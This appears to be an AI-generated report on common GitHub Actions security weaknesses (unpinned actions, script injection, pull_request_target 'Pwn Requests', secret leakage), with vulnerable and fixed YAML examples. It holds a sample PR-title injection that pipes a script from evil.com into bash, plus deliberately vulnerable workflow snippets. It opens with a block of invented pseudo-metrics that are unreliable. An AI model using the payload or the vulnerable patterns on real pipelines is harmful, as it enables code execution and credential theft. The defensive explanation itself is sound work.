<img src="https://r2cdn.perplexity.ai/pplx-full-logo-primary-dark%402x.png" style="height:64px;margin-right:32px"/>

# Common security vulnerabilities in popular GitHub Actions

```json
{
  "Hickam_Orientation": {
    "Occam_Reject": "I have rejected the simple explanation that 'GitHub Actions vulnerabilities = just unpinned dependencies'. The attack surface is a multi-layered sociotechnical system where YAML semantics, runner execution models, trust-boundary confusion, and supply-chain topology interact as co-equal attack vectors.",
    "Comorbid_Factors": [
      "Factor A: Tag mutability creates invisible substitution attacks — the same @v4 reference can silently point to malicious code overnight without any workflow file change (CVE-2025-30066, CVE xygeni-action March 2026)",
      "Factor B: The pull_request_target trigger has a fundamentally broken trust model — it grants repository-level write permissions to workflows triggered by untrusted fork code, a design decision that created the entire 'Pwn Request' attack class",
      "Factor C: Secret governance is structurally permissive — write access to any repository implicitly grants secret management capability, meaning a compromised contributor token gives credential exfiltration rights by default"
    ]
  },
  "Contrastive_Delta": {
    "Amateur_Impulse": "List common GitHub Actions vulnerabilities with basic descriptions.",
    "Inductive_Synthesis": "Aggregating the comorbidities, the pattern is: GitHub Actions's attack surface is not primarily in the YAML files developers write — it is in the runtime resolution model (mutable refs), the event-trigger permission architecture (pull_request_target), and the implicit secret inheritance system — three design properties that individually seem flexible but together create compounding exploitability.",
    "Abductive_Leap": "The non-obvious hypothesis: GitHub Actions' most dangerous vulnerabilities are architectural, not configurational. No amount of developer education about pinning SHA hashes solves the structural problem that transitive action dependencies are resolved at runtime without integrity verification — a property GitHub itself acknowledged in the 2026 roadmap by announcing a dependency lock file system modeled on Go modules.",
    "Expert_Correction": "This report maps all 10 classified CWE-grounded weakness categories from the 2026 arXiv empirical study (Fares et al.), grounds each in real CVEs and incident case studies, quantifies their real-world prevalence from scanning 2,722 enterprise workflows, and maps GitHub's architectural response via the 2026 security roadmap."
  },
  "Martensite_Metrics": {
    "Aesthetic_Tension": "High — bridges academic CWE taxonomy, real CVE exploits, and GitHub's own 2026 engineering roadmap",
    "Intent_Divergence_Risk": "Safe (0.12) — all claims grounded in primary sources from arXiv, GitHub Blog, GHSA, and Wiz Research",
    "Twinning_Mechanism": "Stabilized by pairing each vulnerability class with a concrete mitigation and the corresponding GitHub 2026 roadmap item that architecturally addresses it"
  }
}
```


***

# Common Security Vulnerabilities in GitHub Actions (Q2 2026)

GitHub Actions' vulnerability landscape is not primarily a developer hygiene problem — it is an **architectural design tension** between the platform's flexibility-first runtime model and the security invariants required of modern software supply chains. A March 2026 empirical study scanning **2,722 real-world workflows from Microsoft, Google, Meta, Amazon, NVIDIA, and Apple** classified 10 distinct weakness categories, each mapped to CWEs and validated by the security scanner maintainers themselves. GitHub's own March 2026 security roadmap acknowledged these vulnerabilities represent a systemic gap, announcing deterministic dependency locking, egress firewalls, and scoped secrets to address the structural roots.[^1][^2][^3]

***

## The 10 Classified Weakness Categories

The following taxonomy comes from the first systematic comparison of 9 GitHub Actions security scanners, run against 2,722 enterprise-grade workflows (collected Feb. 27, 2026):[^1]


| \# | Weakness | CWE Mapping | Prevalence Signal |
| :-- | :-- | :-- | :-- |
| 1 | **Unpinned Dependency (UDW)** | CWE-829 | 251 instances in 14 repos [^4] |
| 2 | **Injection Weakness (IW)** | CWE-20, CWE-94 | Most exploited class; Pwn Requests [^5] |
| 3 | **Excessive Permission (EPW)** | CWE-250, CWE-732 | 13 workflow-level write permission issues in 14 repos [^4] |
| 4 | **Privileged Trigger (PTW)** | CWE-862 | 3 `pull_request_target` token exposures in 14 repos [^4] |
| 5 | **Artifact Integrity (AIW)** | CWE-353, CWE-494 | No checksum validation widespread [^1] |
| 6 | **Secrets Exposure (SEW)** | CWE-200, CWE-522 | Log exfiltration confirmed in CVE-2025-30066 [^6] |
| 7 | **Control Flow (CFW)** | CWE-571 | YAML folded-scalar `if:` always-true bypass [^1] |
| 8 | **Known Vulnerable Component (KVCW)** | CWE-1395 | Deprecated action versions still active in NVIDIA, Apple repos [^1] |
| 9 | **Hardening Gap (HGW)** | CWE-223 | No SAST/SCA in pipeline — no scanner sees what isn't there [^1] |
| 10 | **Runner Compatibility (GRCW)** | CWE-477, CWE-440 | Deprecated `setup-node@v1` disables security checks silently [^1] |


***

## Vulnerability Deep Dives

### 1 — Unpinned Dependency Weakness (UDW)

The single most prevalent structural vulnerability: using mutable tag references like `actions/checkout@v4` or `@main` instead of a full commit SHA. When an attacker compromises an upstream action repository and retroactively moves a tag to a malicious commit, every downstream workflow picking up that tag executes the attacker's code **without any change in the workflow YAML itself**. This was the exact mechanism of **CVE-2025-30066** (`tj-actions/changed-files`, March 2025), which propagated malicious code to **23,000+ repositories including Coinbase**. In March 2026, the `xygeni-action` was compromised through the same tag-poisoning mechanism, deploying a **C2 reverse shell** on every runner that referenced `@v5`.[^2][^7][^6][^1]

```yaml
# ❌ VULNERABLE — tag is mutable, can be poisoned overnight
- uses: actions/checkout@v4

# ✅ SECURE — commit SHA is immutable
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

Scanning 14 open-source GitHub Actions pipelines in March 2026 found **251 unpinned action instances** — the dominant finding by a large margin. GitHub's 2026 roadmap directly addresses this with a forthcoming `dependencies:` lockfile section in workflow YAML, modeled on Go's `go.mod + go.sum`, providing deterministic, reviewable, and hash-verified dependency resolution.[^3][^4]

***

### 2 — Injection Weakness (IW)

The most exploitable class in live attacks: untrusted user-controlled event data — pull request titles, branch names, issue body text, `workflow_dispatch` inputs — is interpolated directly into `run:` shell commands via `${{ ... }}` expressions. Since GitHub Actions evaluates these expressions *before* the shell parses them, an attacker who sets their PR title to:[^2]

```
a"; curl https://evil.com/exfil.sh | bash #
```

…can achieve **arbitrary code execution on the runner** if a workflow step interpolates `${{ github.event.pull_request.title }}` into a shell command. The fix is to pass untrusted data through environment variables (which are not evaluated as shell metacharacters before assignment), never inline:[^8]

```yaml
# ❌ VULNERABLE — direct interpolation into shell
- run: echo "PR title: ${{ github.event.pull_request.title }}"

# ✅ SECURE — pass through environment variable
- run: echo "PR title: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

The `zizmor` and `semgrep` scanners from the 2026 arXiv benchmark are the most effective at detecting injection patterns, while `actionlint` catches a complementary subset.[^1]

***

### 3 — Privileged Trigger Weakness / "Pwn Request" (PTW)

The architecturally deepest vulnerability class: workflows triggered by `pull_request_target` run **in the base repository context** with full repository-level permissions and access to all secrets — even when triggered by a pull request from an **untrusted fork**. Three conditions must co-occur to create full exploitation:[^9][^5]

1. Workflow trigger is `pull_request_target`
2. The workflow checks out the PR head ref (attacker-controlled code) via `ref: ${{ github.event.pull_request.head.ref }}`
3. The workflow uses `${{ secrets.GITHUB_TOKEN }}` or other secrets in subsequent steps

Praetorian Research demonstrated this against **Microsoft's own `gpt-review` repository** in 2023, achieving credential theft by simply modifying Python code in a PR. The August 2024 **Azure Karpenter Provider incident** involved the same pattern, exfiltrating privileged CI credentials.[^10][^1]

```yaml
# ❌ CRITICAL VULNERABILITY — attacker fork code runs with repo-level secrets
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.ref }}  # ← Attacker-controlled
      - run: pip install .                                  # ← Runs attacker's setup.py
      - uses: ./                                           # ← Runs attacker's action.yml
        with:
          token: ${{ secrets.GITHUB_TOKEN }}               # ← Exfiltrated
```

GitHub's 2026 roadmap will introduce **event rules** within the new policy framework that allow organizations to **prohibit `pull_request_target` entirely** at the organization level, forcing use of the safer `pull_request` trigger (which does not grant secret access to fork code).[^3]

***

### 4 — Excessive Permission Weakness (EPW)

Of 18,938 real-world workflows analyzed in a Semantics Scholar study, the most frequent non-optimal practice was **"No Permissions Specified"** — meaning the workflow runs with the platform default, which grants broad `write` permissions to `GITHUB_TOKEN`. This means that if any step in the workflow is compromised via injection or a malicious dependency, the attacker's code can immediately:[^11]

- Push commits to the repository
- Modify or close issues and PRs
- Write to GitHub Packages or GitHub Pages
- Trigger other workflow runs[^2]

The scan of 14 open-source repos found **13 cases of workflow-level write permissions lacking job-level scoping**. The fix is explicit minimum permissions at both workflow and job levels:[^4]

```yaml
# ✅ SECURE — permissions block at workflow level
permissions: read-all           # deny all write by default

jobs:
  deploy:
    permissions:
      contents: read            # explicitly grant only what's needed
      packages: write           # and only at the job that needs it
```


***

### 5 — Artifact Integrity Weakness (AIW)

When a workflow passes artifacts between jobs using `actions/upload-artifact` and `actions/download-artifact`, it typically downloads the artifact and uses it directly **without any checksum or signature verification**. If an attacker gains access to the runner environment mid-pipeline (via injection or a compromised upstream step), they can substitute the artifact with a backdoored binary. The poison propagates to every downstream job and potentially to production.[^1][^2]

This weakness also manifests in **cache poisoning**: `actions/cache` stores and restores dependency trees without integrity verification. A compromised cache entry can deliver malicious packages to builds that never explicitly referenced them.[^1]

```yaml
# ❌ VULNERABLE — downloads artifact with no integrity check
- uses: actions/download-artifact@v4
  with:
    name: release-binary

# ✅ SECURE — verify SHA256 after download
- uses: actions/download-artifact@v4
  with:
    name: release-binary
- run: |
    echo "${{ vars.EXPECTED_BINARY_SHA256 }}  release-binary" | sha256sum -c
```


***

### 6 — Secrets Exposure Weakness (SEW)

CI/CD secrets are exposed through two primary mechanisms. First, **log leakage**: GitHub's secret masking only works for exact string matches — if a secret is base64-encoded, URL-encoded, or split across output lines, it bypasses masking and appears in public logs. This was the direct exploitation vector of CVE-2025-30066: the malicious `tj-actions/changed-files` payload dumped the runner process environment (containing all injected secrets) to the workflow log. Second, **`secrets: inherit` over-sharing**: passing all parent secrets to a reusable workflow grants external or untrusted workflow code access to credentials it was never intended to receive.[^12][^13][^2]

```yaml
# ❌ DANGEROUS — passes ALL secrets to external reusable workflow
jobs:
  call-external:
    uses: external-org/shared-workflows/.github/workflows/ci.yml@main
    secrets: inherit

# ✅ SECURE — pass only the specific secrets required
jobs:
  call-external:
    uses: external-org/shared-workflows/.github/workflows/ci.yml@main
    secrets:
      DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
```

GitHub's 2026 roadmap introduces **scoped secrets** — binding credentials to specific branches, environments, workflow paths, or trusted reusable workflow identities, replacing the current repository-level grant model.[^3]

***

### 7 — Control Flow Weakness (CFW)

A subtle YAML semantic trap: GitHub Actions evaluates `if:` conditions in jobs and steps. When a multi-line boolean expression is written using YAML's **folded scalar operator (`>`)**, the entire expression evaluates to a non-empty string (literally `"true"` or `"false"`) rather than a boolean — and in GitHub Actions, **any non-empty string in an `if:` evaluates to `true`**. This means security gates written this way are silently bypassed:[^1]

```yaml
# ❌ ALWAYS RUNS — folded scalar returns non-empty string, not boolean
if: >
  ${{ github.event.workflow_run.conclusion == 'success' &&
      github.actor != 'dependabot[bot]' }}

# ✅ CORRECT — single-line expression evaluates as boolean
if: ${{ github.event.workflow_run.conclusion == 'success' && github.actor != 'dependabot[bot]' }}
```

Attackers can exploit CFW by introducing PRs that "fix formatting" of security-gate conditions using folded scalars, silently disabling the gate while appearing to leave the logic unchanged.[^1]

***

### 8 — Known Vulnerable Component Weakness (KVCW)

Using actions with known CVEs or deprecated runtimes exposes pipelines to documented exploits. The 2026 empirical study found deprecated `actions/setup-node@v1` (which relies on Node.js 12, EOL in 2022) still active in repositories from Apple, NVIDIA, and Tencent — this version runs on a deprecated runtime that GitHub's Ubuntu 24.04 runners are phasing out, causing security-check jobs to **silently fail or be skipped**. Attackers who can introduce version downgrades via PR (even with apparent justification) can disable security scanning steps by exploiting runner incompatibilities.[^2][^1]

Supply chain attacks now systematically target second-order dependencies: tj-actions/changed-files was itself compromised *through* its dependency on a compromised upstream action — a transitive vulnerability invisible to anyone only checking direct dependencies.[^2]

***

### 9 — Hardening Gap Weakness (HGW)

The absence of security tooling in a pipeline is itself a vulnerability class: no scanner can detect vulnerabilities in code that was never scanned. The 2026 benchmark found workflows from major tech companies containing only build and test steps with **zero security scanning** — no SAST, no dependency audit, no secret scanning, no container scanning. When combined with the `continue-on-error: true` anti-pattern (which silences failures in security jobs), entire security layers effectively disappear from the pipeline without any visible YAML change.[^1]

***

### 10 — Runner Compatibility Weakness (GRCW)

Referencing deprecated action versions (e.g., `actions/setup-node@v1` requires Node.js 12 runtime, now removed from GitHub-hosted runners) causes jobs to error out with cryptic runner compatibility failures. When security-check jobs hit these failures and are configured with `continue-on-error: true` (common in legacy workflows), the checks are effectively disabled — a security regression that looks like a runner infrastructure issue rather than a vulnerability.[^1]

***

## Real-World Attack Chronology

The escalation of GitHub Actions attacks is quantifiable and accelerating:[^14][^1]

- **March 2025 — CVE-2025-30066** (`tj-actions/changed-files`): Attackers retroactively moved multiple version tags to a malicious commit. The payload dumped all runner environment variables (including secrets) to public workflow logs. **23,000+ repositories compromised**, including Coinbase. First discovered by StepSecurity.[^6][^13]
- **August 2024 — Azure Karpenter Provider**: `pull_request_target` workflow allowed an untrusted fork ref to be checked out and executed in privileged context. Privileged CI credentials exfiltrated.[^1]
- **March 2026 — xygeni-action C2 compromise**: Tag poisoning of `@v5` caused every referencing workflow to install and execute a **C2 reverse shell backdoor** on the runner at job startup.[^1]

Supply chain attacks targeting CI/CD pipelines increased measurably in 2025, with GitHub Actions being the primary vector — a direct consequence of its dominant 41% organizational market share making it the highest-value target.[^14]

***

## Scanner Ecosystem: No Single Tool Is Sufficient

The March 2026 systematic scanner benchmark (9 scanners, 2,722 workflows, 84 rules mapped to 10 weaknesses) found that **no single scanner covers all 10 weakness categories**. The fastest scanners complete analysis in a **median of 2.71 seconds per workflow** across 7 of the 9 tools — fast enough for seamless CI integration. The recommended combination for complete coverage is:[^1]


| Scanner | Strength | Language |
| :-- | :-- | :-- |
| **zizmor** | Injection + Pwn Request detection | Rust |
| **poutine** | Conservative high-risk supply chain | Go |
| **actionlint** | Syntax + type correctness + injection | Go |
| **scorecard** (OSSF) | Dependency health scoring | Go |
| **ggshield** | Secret exposure in logs | Python |
| **semgrep** | Custom SAST rules for workflow patterns | OCaml |
| **frizbee** | SHA pinning enforcement | Go |


***

## GitHub's Architectural Response: 2026 Security Roadmap

GitHub published a formal 2026 security roadmap on March 25, 2026, acknowledging that the platform's design defaults make these vulnerabilities structurally easy to introduce and hard to detect. The roadmap addresses the architectural roots of each weakness category across three layers:[^15][^3]

- **Ecosystem layer**: Workflow-level `dependencies:` lockfile (Go `go.mod` model) — SHA-locks all direct *and transitive* action dependencies, making poisoned tag attacks impossible when enforced[^3]
- **Attack surface layer**: Policy-driven execution rules (who can trigger which events), scoped secrets (bound to branch/environment/workflow identity), and separation of write access from secret management permissions[^3]
- **Infrastructure layer**: Actions Data Stream (near-real-time execution telemetry to S3/Azure Event Hub) and native **Layer-7 egress firewall** for GitHub-hosted runners — immutable even if an attacker gains root inside the VM[^3]

The egress firewall directly addresses the primary exfiltration vector of CVE-2025-30066 and the xygeni-action C2 attack: unrestricted outbound network access from runners allowed secrets to be sent to attacker-controlled endpoints with no blocking or alerting. GitHub explicitly frames this as treating CI/CD runners as **critical infrastructure endpoints**, not disposable ephemeral VMs.[^16][^3]
<span style="display:none">[^17][^18][^19][^20][^21][^22][^23][^24][^25][^26][^27][^28][^29][^30]</span>

<div align="center">⁂</div>

[^1]: https://arxiv.org/html/2601.14455v2

[^2]: https://arxiv.org/html/2601.14455v1

[^3]: https://github.blog/news-insights/product-news/whats-coming-to-our-github-actions-2026-security-roadmap/

[^4]: https://www.reddit.com/r/cybersecurity/comments/1rletuo/findings_from_scanning_14_opensource_github/

[^5]: https://labs.snyk.io/resources/exploring-vulnerabilities-github-actions/

[^6]: https://github.com/advisories/ghsa-mrrh-fwg8-r2c3

[^7]: https://blog.barracuda.com/2025/03/25/GitHub-as-supply-chain-attack-vector

[^8]: https://arxiv.org/pdf/2208.03837.pdf

[^9]: https://www.stepsecurity.io/blog/github-actions-pwn-request-vulnerability

[^10]: https://www.praetorian.com/blog/pwn-request-hacking-microsoft-github-repositories-and-more/

[^11]: https://www.semanticscholar.org/paper/Revisiting-Security-Practices-for-Github-Actions-Huang-Lin/61f1528b403ebf5029118d0c9a13cedec0742954

[^12]: https://www.cybersecuritydive.com/news/supply-chain-github-exposure-secrets/742693/

[^13]: https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066

[^14]: https://www.darkreading.com/application-security/supply-chain-attacks-targeting-github-actions-increased-in-2025

[^15]: https://www.mexc.com/news/984627

[^16]: https://www.notebookcheck.net/GitHub-outlines-its-2026-Actions-security-roadmap.1261647.0.html

[^17]: https://arxiv.org/html/2602.06009v1

[^18]: https://arxiv.org/html/2602.14572v3

[^19]: https://arxiv.org/pdf/2602.06009.pdf

[^20]: https://arxiv.org/html/2511.01395v1

[^21]: https://arxiv.org/html/2602.03012v1

[^22]: https://arxiv.org/html/2504.17473v1

[^23]: https://arxiv.org/html/2601.17548v1

[^24]: https://arxiv.org/html/2603.24282v2

[^25]: https://arxiv.org/html/2602.14572v1

[^26]: https://arxiv.org/html/2510.26676v2

[^27]: https://arxiv.org/html/2512.23385v1

[^28]: https://github.com/orgs/community/discussions/190621

[^29]: https://www.kaspersky.com/blog/malicious-github-action-changed-files/53179/

[^30]: https://github.com/0xMarcio/cve

